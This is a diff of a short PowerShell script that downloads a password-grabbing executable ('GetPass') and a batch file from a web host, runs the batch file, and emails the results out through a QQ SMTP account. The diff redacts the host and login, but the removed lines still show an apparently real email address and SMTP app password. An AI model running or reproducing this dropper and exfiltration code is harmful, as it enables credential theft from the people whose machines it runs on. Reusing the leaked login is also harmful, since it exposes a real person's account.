@@ -1,6 +1,6 @@
-(new-object System.Net.WebClient).DownloadFile('http://www.cdxy.me/GetPass.rar','D:\Get.exe');
+(new-object System.Net.WebClient).DownloadFile('http://www.xxx.xxx/GetPass.rar','D:\Get.exe');
 
-(new-object System.Net.WebClient).DownloadFile('http://www.cdxy.me/Command.rar','D:\Command.bat');
+(new-object System.Net.WebClient).DownloadFile('http://www.xxx.xxx/Command.rar','D:\Command.bat');
 
 D:\Command.bat;
 $SMTPServer = 'smtp.qq.com'
@@ -9,13 +9,13 @@ $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 
 $SMTPInfo.EnableSsl = $true 
 
-$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('941335582@qq.com', 'olawgiwsvcimbdgf');
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('xxxxx@qq.com', 'olawgxxxxxxx');
 
 $ReportEmail = New-Object System.Net.Mail.MailMessage
 
-$ReportEmail.From = '941335582@qq.com'
+$ReportEmail.From = 'xxxxx@qq.com'
 
-$ReportEmail.To.Add('941335582@qq.com')
+$ReportEmail.To.Add('xxxxx@qq.com')
 
 $ReportEmail.Subject = 'GetPass'
 
